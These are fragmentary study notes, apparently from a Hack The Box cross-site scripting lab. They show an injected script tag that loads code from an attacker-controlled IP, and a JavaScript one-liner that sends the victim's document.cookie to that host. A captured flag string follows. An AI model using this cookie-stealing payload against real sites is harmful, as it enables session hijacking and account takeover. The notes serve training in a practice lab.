...
```shell-session
anasec@htb[/htb]$ cat cookies.txt 
...
"><script src=http://10.10.14.47:2001/profilepicture></script>

```javascript
new Image().src='http://10.10.14.47:2001/index.php?c='+document.cookie
```

![[Pasted image 20240625211301.png]]

c00k1355h0u1d8353cu23d

![[Pasted image 20240625212225.png]]

-Refresh after cookie is set
